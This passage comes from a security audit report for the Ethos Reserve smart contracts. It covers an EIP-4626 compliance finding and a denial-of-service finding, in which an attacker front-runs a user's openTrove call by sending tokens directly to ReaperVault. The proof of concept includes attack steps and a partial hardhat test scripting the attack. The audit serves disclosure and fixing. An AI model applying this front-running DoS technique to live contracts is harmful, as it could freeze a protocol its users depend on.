class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">405</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">totalLoss</span><span class=\"mtk1\"> &lt;= ((</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">totalLoss</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">withdrawMaxLoss</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">PERCENT_DIVISOR</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">406</span><span class=\"mtk1\">:                 </span><span class=\"mtk8\">&quot;Withdraw loss exceeds slippage&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">407</span><span class=\"mtk1\">:             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">408</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">409</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">410</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">value</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>In this case, if a strategy incurs any losses, the actual withdrawal amount will NOT be the exact same specified when calling the <code>withdraw</code> function, as it will be less than that, as <strong>the loss is detracted from the withdrawn value</strong>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">388</span><span class=\"mtk1\">:                 </span><span class=\"mtk3\">// Withdrawer incurs any losses from withdrawing as reported by strat</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">389</span><span class=\"mtk1\">:                 </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">loss</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">390</span><span class=\"mtk1\">:                     </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">391</span><span class=\"mtk1\">:                     </span><span class=\"mtk12\">totalLoss</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">392</span><span class=\"mtk1\">:                     </span><span class=\"mtk11\">_reportLoss</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">393</span><span class=\"mtk1\">:                 }</span></span></span></code></pre>\n<p>If that happens, then <code>assets requested > assets received</code>.</p>\n<p>As the specification says that the withdrawal process <code>MUST revert if all of assets cannot be withdrawn (due to withdrawal limit being reached, slippage, the owner not having enough shares, etc)</code>, this makes the <code>ReaperVaultERC4626</code> non EIP-4626 compliant.</p>\n<p>This might cause integration problems in the future, which can lead to a wide range of issues, including loss of funds.</p>\n<p>Because EIP-4626 is aimed to create a consistent and robust implementation pattern for Tokenized Vaults, and even a slight deviation from the standard would break composability (and potentially lead to a loss of funds), this is categorized as a high risk.</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>withdraw</code> and <code>redeem</code> functions should be modified to meet the specifications of EIP-4626: the <code>value</code> transferred must always be equal to the <code>assets</code> withdrawn. In case this is not true, the transaction must be reverted.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/247#issuecomment-1463904098\">Trust (judge) decreased severity to Medium</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/247#issuecomment-1469264416\">tess3rac7 (Ethos Reserve) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-13-dos-by-directly-transferring-assets-to-reaper-vault\" style=\"position:relative;\"><a href=\"#m-13-dos-by-directly-transferring-assets-to-reaper-vault\" aria-label=\"m 13 dos by directly transferring assets to reaper vault permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/246\">[M-13] DOS by directly transferring assets to Reaper Vault</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/246\">gjaldon</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L251\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L251</a><br>\n<a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L264-L274\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L264-L274</a><br>\n<a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L207\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L207</a><br>\n<a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L185\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L185</a></p>\n<p>Attacker can DOS the protocol by directly transferring assets to the ReaperVault. This causes a DOS by underflow in the <code>ActivePool._rebalance</code> logic. All core ActivePool functionality will be disabled including all BorrowerOperations functionality and other functionality that relies on ActivePool. This essentially renders the protocol unusable until the protocol team figures out the fix, which is to directly transfer enough assets to ReaperVault to address the underflow. Even then, the attacker can just repeat the attack and make the protocol unusable once again.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>With the below steps, an attacker can DOS the protocol:</p>\n<ol>\n<li>A trove already exists and an initial deposit to the ReaperVault was already done by the ActivePool.</li>\n<li>Bob opens a Trove using 190e3 WBTC as collateral (this could be any amount enough to satisfy the minimum borrowing amount of 90 LUSD).</li>\n<li>Alice (the Attacker) frontruns Bob’s openTrove transaction and transfers WBTC directly to the ReaperVault. The amount of assets transferred will be 1 + amount of assets ActivePool will deposit to the ReaperVault based on yieldingPercentage when Bob’s openTrove tx is processed.</li>\n<li>Due to Alice’s frontrun, the below branch in <code>ActivePool._rebalance</code> will trigger during Bob’s <code>openTrove</code> transaction:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">netAssetMovement</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">IERC4626</span><span class=\"mtk1\">(</span><span class=\"mtk12\">yieldGenerator</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(-</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">netAssetMovement</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<p><code>vars.netAssetMovement</code> will be -1 because of Alice’s direct transfer of assets amounting to 1 + ActivePool’s deposit amount.</p>\n<ol start=\"5\">\n<li>Because of Alice’s direct transfer of WBTC to ReaperVault, let’s say 1 Vault share is now worth 15 units of WBTC. <code>ReaperVaultERC4626.withdraw</code> converts assets to shares with some rounding up behavior and then converts those shares to assets again to get the amount withdrawn. This leads to at least 15 units of WBTC being withdrawn even though <code>vars.netAssetMovement = 1</code>.</li>\n<li>It is this difference between the amount of assets withdrawn from the ReaperVault and the accounting for total yield amount (<code>yieldingAmount[_collateral]</code>) that causes an underflow in subsequent calls to <code>ActivePool._rebalance</code>. The underflow happens here:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"># </span><span class=\"mtk8\">`vars.sharesToAssets`</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">now</span><span class=\"mtk1\"> </span><span class=\"mtk12\">less</span><span class=\"mtk1\"> </span><span class=\"mtk12\">than</span><span class=\"mtk1\"> </span><span class=\"mtk8\">`vars.currentAllocated`</span><span class=\"mtk1\"> </span><span class=\"mtk12\">and</span><span class=\"mtk1\"> </span><span class=\"mtk4\">this</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operation</span><span class=\"mtk1\"> </span><span class=\"mtk12\">will</span><span class=\"mtk1\"> </span><span class=\"mtk12\">now</span><span class=\"mtk1\"> </span><span class=\"mtk12\">always</span><span class=\"mtk1\"> </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">due</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underflow</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"># </span><span class=\"mtk8\">`vars.sharesToAssets`</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">total</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Vault</span><span class=\"mtk1\"> </span><span class=\"mtk15\">while</span><span class=\"mtk1\"> </span><span class=\"mtk8\">`vars.currentAllocated`</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk8\">`yieldingAmount[_collateral]`</span><span class=\"mtk1\">. </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">profit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sharesToAssets</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentAllocated</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Here is the <a href=\"https://gist.githubusercontent.com/gjaldon/460741803d1cb81b7bd76d7240b4ba24/raw/45601e479353f85baa66160104aaca1a54b7a43e/ethos_reserve_dos.patch\">git diff</a> for a test POC that shows the attack. To run the POC, do the following:</p>\n<ol>\n<li>Copy all contents of the gist to <code>/tmp/changes.patch</code></li>\n<li>Clone the project repo and cd to the Ethos-Core directory.</li>\n<li>Run <code>git apply /tmp/changes.patch</code> in the Ethos-Core directory.</li>\n<li>Run <code>npm install</code> from the command line from Ethos-Core’s root directory</li>\n<li>Run <code>npx hardhat test --grep \"DOS attack\"</code>. The test should pass</li>\n</ol>\n<p>The git diff is huge since it includes copying of Ethos-Vault contracts into the Ethos-Core project so they can be used within the Ethos-Core tests. The test looks like:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;DOS attack&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">activePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setYieldingPercentage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">].</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">activePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setYieldClaimThreshold</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">].</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">].</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">, </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">8</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">].</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrowerOperations</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">8</span><span class=\"mtk1\">), {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">].</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">, </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">8</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">].</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrowerOperations</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">8</span><span class=\"mtk1\">), {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">].</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">carol</span><span class=\"mtk1\">, </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">8</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">].</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrowerOperations</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">8</span><span class=\"mtk1\">), {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">carol</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lusdToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">unprotectedMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">, </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100_000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">18</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lusdToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">unprotectedMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">, </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100_000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">18</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">priceFeed</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">].</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100_000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">18</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reaperVault</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">erc4626vaults</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reaperVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">grantRole</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reaperVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">DEPOSITOR</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">activePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">borrowerOperations</span><span class=\"mtk1\">.</span><span class=\"mtk11\">openTrove</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">].</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">190</span><span class=\"mtk1\">, </span><span class=\"mtk7\">3</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">th</span><span class=\"mtk1\">.</span><span class=\"mtk12\">_100pct</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">90</span><span class=\"mtk1\">, </span><span class=\"mtk7\">18</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        { </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alice</span><span class=\"mtk1\"> }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Alice frontruns Bob&#39;s deposit by transfering 300_001 WBTC to ReaperVault. </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// 300_001 WBTC is 1 unit of WBTC more than the yield that is going to be</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// deposited to the ReaperVault.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">].</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reaperVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">300001</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">borrowerOperations</span><span class=\"mtk1\">.</span><span class=\"mtk11\">openTrove</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span 